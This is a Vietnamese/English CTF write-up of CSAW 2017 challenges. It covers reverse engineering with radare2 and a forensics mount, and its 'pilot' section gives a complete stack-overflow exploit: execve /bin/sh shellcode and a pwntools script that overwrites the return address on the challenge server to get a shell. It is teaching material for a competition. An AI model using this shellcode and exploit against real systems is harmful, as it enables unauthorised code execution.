(aan))[0x004008b0]&amp;gt; afl0x004007c8 3 26 sub.__gmon_start___248_7c80x00400800 2 16 -&amp;gt; 32 sym.imp.setvbuf0x00400810 2 16 -&amp;gt; 48 sub._ZNSt8ios_base4InitC1Ev_32_8100x00400820 2 16 -&amp;gt; 48 sym.imp.read0x00400830 2 16 -&amp;gt; 48 sym.imp.__libc_start_main0x00400840 2 16 -&amp;gt; 48 sym.imp.__cxa_atexit0x00400850 2 16 -&amp;gt; 48 sub._ZNSt8ios_base4InitD1Ev_64_8500x00400860 2 16 -&amp;gt; 48 sub._ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc_72_8600x00400870 2 16 -&amp;gt; 48 sub._ZNSolsEPKv_80_8700x00400880 2 16 -&amp;gt; 48 sub._ZNSolsEPFRSoS_E_88_8800x00400890 2 16 -&amp;gt; 48 sub._ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__96_8900x004008a0 1 16 sub.__gmon_start___248_8a00x004008b0 1 41 entry00x004008e0 4 50 -&amp;gt; 41 fcn.004008e00x004009a6 4 400 main0x00400b36 4 62 sub.std::ios_base::Init.Init___b36[0x004008b0]&amp;gt; Nhìn có vẻ rất ghê vì binary đã bị stripped. Trong một nỗ lực giảm bớt độ khó của việc debug, mình tìm thấy tool này: syms2elf. Tool này có thể dùng với radare2 hoặc IDA, có chức năng thêm lại symbol table vào binary đã bị stripped, giúp cho việc debug trong gdb đỡ thốn gấp vạn lần. Sau khi rename vài hàm quan trọng như main, mình export binary ra bằng dòng lệnh $syms2elf pilot_unstripped. Giờ thì mình đã có thể mở binary lên và debug như binary chưa bị stripped một cách thoải mái.Đặt breakpoint tại vị trí gọi hàm read trong main ở 0x00400ae0:pwndbg&amp;gt; rStarting program: /root/workspace/ctfs/2017/csaw/pwn/pilot/pilot_unstripped [*]Welcome DropShip Pilot...[*]I am your assitant A.I....[*]I will be guiding you through the tutorial....[*]As a first step, lets learn how to land at the designated location....[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines &amp;amp; Medics...[*]Good Luck Pilot!....[*]Location:0x7fffffffe0a0[*]Command:Breakpoint 1, 0x0000000000400ae0 in main ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA[──────────────────────────────────────────────────────────────────REGISTERS───────────────────────────────────────────────────────────────────]*RAX 0x7fffffffe0a0 —▸ 0x400b90 ◂— push r15 RBX 0x0*RCX 0x7f1788dd3720 (__write_nocancel+7) ◂— cmp rax, -0xfff*RDX 0x40 RDI 0x0*RSI 0x7fffffffe0a0 —▸ 0x400b90 ◂— push r15*R8 0x7f1789091700 (proc_file_chain_lock) ◂— 0*R9 0x7f1789090600 (_IO_2_1_stdout_) ◂— xchg dword ptr [rax], ebp /* 0xfbad2887 */*R10 0x60d*R11 0x246*R12 0x4008b0 (entry0) ◂— xor ebp, ebp*R13 0x7fffffffe1a0 ◂— 0x1 R14 0x0 R15 0x0*RBP 0x7fffffffe0c0 —▸ 0x400b90 ◂— push r15*RSP 0x7fffffffe0a0 —▸ 0x400b90 ◂— push r15*RIP 0x400ae0 (main+314) ◂— call 0x400820[────────────────────────────────────────────────────────────────────DISASM────────────────────────────────────────────────────────────────────] ► 0x400ae0 &amp;lt;main+314&amp;gt; call read@plt &amp;lt;0x400820&amp;gt; fd: 0x0 buf: 0x7fffffffe0a0 —▸ 0x400b90 ◂— push r15 nbytes: 0x40Như vậy ta thấy ngay địa chỉ của buffer khi đọc vào đã được in ra. Vậy thì exploit quá đơn giản rồi, chỉ cần đặt shellcode lên buffẻr và ghi đè return address bằng địa chỉ buffer thôi. Shellcode của mình có chỉnh sửa một chút ở instruction đầu tiên để nới rộng stack dành cho shellcode. 0: 48 83 ec 48 sub rsp,0x48 4: 48 31 d2 xor rdx,rdx 7: 48 bb ff 2f 62 69 6e movabs rbx,0x68732f6e69622fff e: 2f 73 68 11: 48 c1 eb 08 shr rbx,0x8 15: 53 push rbx 16: 48 89 e7 mov rdi,rsp 19: 48 31 c0 xor rax,rax 1c: 50 push rax 1d: 57 push rdi 1e: 48 89 e6 mov rsi,rsp 21: b0 3b mov al,0x3b 23: 0f 05 syscallfrom pwn import *context.arch = &#39;amd64&#39;s = remote(&#39;pwn.chal.csaw.io&#39;, 8464)raw_input(&#39;Exploit?&#39;)shellcode = &quot;\\x48\\x83\\xEC\\x48\\x48\\x31\\xD2\\x48\\xBB\\xFF\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x48\\xC1\\xEB\\x08\\x53\\x48\\x89\\xE7\\x48\\x31\\xC0\\x50\\x57\\x48\\x89\\xE6\\xB0\\x3B\\x0F\\x05&quot;s.recvuntil(&#39;[*]Location:&#39;)leak_buffer = s.recvuntil(&#39;\\n&#39;).strip()print leak_bufferleak_buffer = int(leak_buffer, 16)s.recvuntil(&#39;[*]Command:&#39;)print &#39;Shellcode is at:&#39;, hex(leak_buffer)payload = &#39;&#39;payload += shellcodepayload += &#39;\\x90&#39; * (40 - len(shellcode))payload += p64(leak_buffer)s.sendline(payload)s.interactive()s.close()➜ python exploit.py [+] Opening connection to pwn.chal.csaw.io on port 8464: DoneExploit?0x7ffe3cf25d80Shellcode is at: 0x7ffe3cf25d80[*] Switching to interactive mode$ iduid=1000(pilot) gid=1000(pilot) groups=1000(pilot)$ whoamipilot$ cat flagflag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}$ EnglishThis is a basic stack overflow challenge. Let’s check out the file info.➜ file pilotpilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, strippedThe information shows that this is a stripped 64-bit binary. A stripped binary is harder to debug. Fortunately, there is a tool that makes debugging stripped binaries slightly easier.Let’s check security settings on this binary using checksec.➜ checksec pilot [*] &#39;/root/workspace/ctfs/2017/csaw/pwn/pilot/pilot&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segmentsAlmost no protection! Let’s run the binary.➜ ./pilot[*]Welcome DropShip Pilot...[*]I am your assitant A.I....[*]I will be guiding you through the tutorial....[*]As a first step, lets learn how to land at the designated location....[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines &amp;amp; Medics...[*]Good Luck Pilot!....[*]Location:0x7fff0ef02250[*]Command:The location in the output seems a lot like an address in the program, probably the address of the buffer. Let’s open it in radare2 to double check.➜ r2 -A pilot [0x004008b0]&amp;gt; afl0x004007c8 3 26 sub.__gmon_start___248_7c80x00400800 2 16 -&amp;gt; 32 sym.imp.setvbuf0x00400810 2 16 -&amp;gt; 48 sub._ZNSt8ios_base4InitC1Ev_32_8100x00400820 2 16 -&amp;gt; 48 sym.imp.read0x00400830 2 16 -&amp;gt; 48 sym.imp.__libc_start_main0x00400840 2 16 -&amp;gt; 48 sym.imp.__cxa_atexit0x00400850 2 16 -&amp;gt; 48 sub._ZNSt8ios_base4InitD1Ev_64_8500x00400860 2 16 -&amp;gt; 48 sub._ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc_72_8600x00400870 2 16 -&amp;gt; 48 sub._ZNSolsEPKv_80_8700x00400880 2 16 -&amp;gt; 48 sub._ZNSolsEPFRSoS_E_88_8800x00400890 2 16 -&amp;gt; 48 sub._ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__96_8900x004008a0 1 16 sub.__gmon_start___248_8a00x004008b0 1 41 entry00x004008e0 4 50 -&amp;gt; 41 fcn.004008e00x004009a6 4 400 main0x00400b36 4 62 sub.std::ios_base::Init.Init___b36[0x004008b0]&amp;gt; This looks quite intimidating as the binary was stripped. syms2elf is a tool that can be used in both radare2 and IDA to add symbols back to the symbol table of the stripped binary. Without the symbols, it is harder to navigate while debugging in gdb. This makes debugging way more comfortable.You can rename functions before adding symbols back to the binary. To export the modified binary with symbols added: $syms2elf pilot_unstripped.Set a breakpoint at the call to read@plt in the main function to see where the input is written:pwndbg&amp;gt; rStarting program: /root/workspace/ctfs/2017/csaw/pwn/pilot/pilot_unstripped [*]Welcome DropShip Pilot...[*]I am your assitant A.I....[*]I will be guiding you through the tutorial....[*]As a first step, lets learn how to land at the designated location....[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines &amp;amp; Medics...[*]Good Luck Pilot!....[*]Location:0x7fffffffe0a0[*]Command:Breakpoint 1, 0x0000000000400ae0 in main ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA[──────────────────────────────────────────────────────────────────REGISTERS───────────────────────────────────────────────────────────────────]*RAX 0x7fffffffe0a0 —▸ 0x400b90 ◂— push r15 RBX 0x0*RCX 0x7f1788dd3720 (__write_nocancel+7) ◂— cmp rax, -0xfff*RDX 0x40 RDI 0x0*RSI 0x7fffffffe0a0 —▸ 0x400b90 ◂— push r15*R8 0x7f1789091700 (proc_file_chain_lock) ◂— 0*R9 0x7f1789090600 (_IO_2_1_stdout_) ◂— xchg dword ptr [rax], ebp /* 0xfbad2887 */*R10 0x60d*R11 0x246*R12 0x4008b0 (entry0) ◂— xor ebp, ebp*R13 0x7fffffffe1a0 ◂— 0x1 R14 0x0 R15 0x0*RBP 0x7fffffffe0c0 —▸ 0x400b90 ◂— push r15*RSP 0x7fffffffe0a0 —▸ 0x400b90 ◂— push r15*RIP 0x400ae0 (main+314) ◂— call 0x400820[────────────────────────────────────────────────────────────────────DISASM────────────────────────────────────────────────────────────────────] ► 0x400ae0 &amp;lt;main+314&amp;gt; call read@plt &amp;lt;0x400820&amp;gt; fd: 0x0 buf: 0x7fffffffe0a0 —▸ 0x400b90 ◂— push r15 nbytes: 0x40As you can see, the address of the input buffer is identical to the address printed in the output of the binary. Since the stack is executable, we only need to put shellcode onto the buffer and overwrite the return address with the address of the input buffer. I slightly modified the shellcode to extend the stack for the actual execution of the shellcode. 0: 48 83 ec 48 sub rsp,0x48 4: 48 31 d2 xor rdx,rdx 7: 48 bb ff 2f 62 69 6e movabs rbx,0x68732f6e69622fff e: 2f 73 68 11: 48 c1 eb 08 shr rbx,0x8 15: 53 push rbx 16: 48 89 e7 mov rdi,rsp 19: 48 31 c0 xor rax,rax 1c: 50 push rax 1d: 57 push rdi 1e: 48 89 e6 mov rsi,rsp 21: b0 3b mov al,0x3b 23: 0f 05 syscallfrom pwn import *context.arch = &#39;amd64&#39;s = remote(&#39;pwn.chal.csaw.io&#39;, 8464)raw_input(&#39;Exploit?&#39;)shellcode = &quot;\\x48\\x83\\xEC\\x48\\x48\\x31\\xD2\\x48\\xBB\\xFF\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x48\\xC1\\xEB\\x08\\x53\\x48\\x89\\xE7\\x48\\x31\\xC0\\x50\\x57\\x48\\x89\\xE6\\xB0\\x3B\\x0F\\x05&quot;s.recvuntil(&#39;[*]Location:&#39;)leak_buffer = s.recvuntil(&#39;\\n&#39;).strip()print leak_bufferleak_buffer = int(leak_buffer, 16)s.recvuntil(&#39;[*]Command:&#39;)print &#39;Shellcode is at:&#39;, hex(leak_buffer)payload = &#39;&#39;payload += shellcodepayload += &#39;\\x90&#39; * (40 - len(shellcode))payload += p64(leak_buffer)s.sendline(payload)s.interactive()s.close()➜ python exploit.py [+] Opening connection to pwn.chal.csaw.io on port 8464: DoneExploit?0x7ffe3cf25d80Shellcode is at: 0x7ffe3cf25d80[*] Switching to interactive mode$ iduid=1000(pilot) gid=1000(pilot) groups=1000(pilot)$ whoamipilot$ cat flagflag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}$ RE: tablez (100 pts.)English version hereVietnamese➜ file tablez tablez: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=72adea86090fb7deeb319e95681fd2c669dcc503, not strippedNhư vậy rất may mắn là binary này không bị stripped. Mở binary lên bằng r2 và xem qua hàm main thì có một số điểm đáng chú ý sau: Dữ liệu được hardcoded từ 0x000008ba tới 0x00000908 Input được nhập vào biến local_90h ở 0x00000924 Một vòng lặp gọi hàm sym.get_tbl_entry với tham số là input. Kết quả hàm này trả về được dùng để thay thế các ký tự trên input buffer. input buffer sau khi bị biến đổi qua vòng lặp ở 3 sẽ được so sánh với dữ liệu hardcoded ở 1 bằng hàm strncmp (0x000009f7). 0x26 ký tự đầu tiên sẽ được so sánh.Hàm sym.get_tbl_entry hoạt động như sau:for (int i = 0; i &amp;lt;= 0xfe; i++) { if (trans_tbl[i * 2] == input[i]) { return trans_tbl[i * 2 + 1]; }}return 0;với trans_tbl là một biến toàn cục đã được viết trước.Như vậy, cách làm của mình như sau: Lấy dữ liệu từ bản trans_tbl và dự liệu hardcode trong hàm main ra (mình gọi là password).Để lấy dữ liệu từ bảng obj.trans_tbl: pr 0xff@ obj.trans_tbl &amp;gt; data.bin(Print Raw 0xff bytes at address of obj.trans_tbl, redirect output to file data.bin) Với mỗi ký tự trong password, bruteforce tất cả các ký tự ASCII để tìm một ký tự c sao cho c sau khi qua hàm get_tbl_entry sẽ biến đổi thành ký tự ở vị trí tương ứng trong password.Solution:from pwn import *from string import printabledef get_char(c): global trans_tbl for i in range(0xfe + 1): if trans_tbl[i * 2] == c: return trans_tbl[i * 2 + 1] return 0trans_tbl = open(&#39;trans_tbl&#39;).read()password = &#39;&#39;password += p64(0xb1e711f59d73b327)password += p64(0x30f4f9f9b399beb3)password += p64(0xb19965237399711b)password += p64(0xf9279923be111165)password += p64(0x65059923)password = password.strip(&#39;\\x00&#39;)flag = &#39;&#39;for i in range(len(password)): for c in printable: if get_char(c) == password[i]: flag += c breakprint flagEnglish➜ file tablez tablez: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=72adea86090fb7deeb319e95681fd2c669dcc503, not strippedFortunately, this binary is not stripped. After examining the main function, there are several noticeable points: There is hardcoded data, seen from 0x000008ba to 0x00000908 The input buffer is local_90h, seen at 0x00000924 A loop calls to sym.get_tbl_entry with the input buffer as the parameter. The returned results are used to replace data on the input buffer. The input buffer after being transformed in #3 is compared to the hardcoded data in #1 using strncmp (0x000009f7). The first 0x26 characters are compared.Pseudo code for sym.get_tbl_entry:for (int i = 0; i &amp;lt;= 0xfe; i++) { if (trans_tbl[i * 2] == input[i]) { return trans_tbl[i * 2 + 1]; }}return 0;with trans_tbl is an initialized global variable.My solution: Extract data from trans_tbl and the hardcoded data at the beginning of main (called password).To extract data from obj.trans_tbl using r2: pr 0xff@ obj.trans_tbl &amp;gt; data.bin(Print Raw 0xff bytes at address of obj.trans_tbl, redirect output to file data.bin) For each character in the password, bruteforce all ASCII characters to find a character c such that c after being transformed by get_tbl_entry will be the corressponding character in the password.Solution:from pwn import *from string import printabledef get_char(c): global trans_tbl for i in range(0xfe + 1): if trans_tbl[i * 2] == c: return trans_tbl[i * 2 + 1] return 0trans_tbl = open(&#39;trans_tbl&#39;).read()password = &#39;&#39;password += p64(0xb1e711f59d73b327)password += p64(0x30f4f9f9b399beb3)password += p64(0xb19965237399711b)password += p64(0xf9279923be111165)password += p64(0x65059923)password = password.strip(&#39;\\x00&#39;)flag = &#39;&#39;for i in range(len(password)): for c in printable: if get_char(c) == password[i]: flag += c breakprint flagMisc: Twitch (100 pts.)English version hereVietnameseBài này là bài bựa nhất trong cả đề. Đại khái là họ stream một cái shell lên twitch. Để điều khiển shell đó thì người xem twitch sẽ vote phím nào được ấn trên bàn phím bằng cách gõ vào phần chat. Để lấy được flag bài này thì số người đó phải exploit 1 binary bị buffer overflow. Mình thì không rảnh nhảy vào vote nên chỉ xem xong cướp flag thôi =)) Điều bựa là mỗi khi flag được lấy ra thành công thì sau vài phút, cái máy tính được stream sẽ tự động reboot và ai không lấy kịp flag thì lại ngồi chờ =))EnglishThis is quite a funny challenge. All the players need to exploit a binary and the shell is streamed on twitch and controlled via a twitch chat. All the players need to vote for the character that they want to type in the shell. To get the flag, you need to be there at the right moment since the machine which contains the binary and the shell reboots whenever the flag is successfully printed out.Forensics: Bestrouter (200 pts.)Bài này khá vớ vẩn. Download file đính kèm về giải nén ra thì ta sẽ được một file .img, là một file image của rasberry pi. Mình dùng lệnh sau để mount file này trên linux, từ đó sẽ đọc được dữ liệu trong file như cấu trúc của một linux filesystem thông thường:sudo mount disk.img ./mnt(Lúc làm bài này mình làm theo hướng dẫn ở đây, thi xong mình xóa xừ nó file kia đi rồi nên không nhớ cụ thể câu lệnh là gì nữa :P )Mở lên và truy cập vào thư mục /var/www/html sẽ thấy được mã nguồn của trang web cần đăng nhập: http://forensics.chal.csaw.io:3287/Trên windows, file này có thể được mở bằng phần mềm chuyên dụng cho forensics như Autopsy. Bài này do ngu người không để ý có cái trang web kia nên mình tìm thấy mật khẩu rồi mãi không biết dùng làm gì :DRE: realism (400 pts. unsolved)Đây là lần đầu tiên trong 1 CTF mà mình dám động tới một bài 400. Trước khi được thông não, mình thường còn chẳng xem đề bài mấy bài này vì nghĩ chỉ có rất khủng mới làm được. Lần này khi mở lên thấy bài này hơn 30 người làm được sau ngày đầu tiên, mình nghĩ rằng đây không phải bài khó nên quyết định thử sức. Đây là một quyết định vừa đúng lại vừa có phần hơi ngu người vì làm mình bỏ lỡ mất bài pwn 200 khá ngon ăn.➜ file main.binmain.bin: DOS/MBR boot sectorSau một hồi tìm hiểu, mình đã chạy được file này. Kết quả ra như sau:Đây là lần đầu tiên mình reverse/debug 1 MBR. Cách cài đặt môi trường để debug như sau:Link tham khảo: tip-debugging-the-early-boot-process-with-qemu-and-gdb Cài đặt qemu-system-i386 Chạy MBR và debug với GDB như sau: qemu-system-i386 -s -S -drive format=raw,file=main.bin: Lệnh này load file MBR nhưng không chạy CPU, đồng thời mở 1 gdbserver tại port 1234 ở localhost để có thể dùng gdb debug Vào gdb: 1. target remote localhost:1234: Kết nối để gdbserver được khởi tạo ở bước trên" } ]
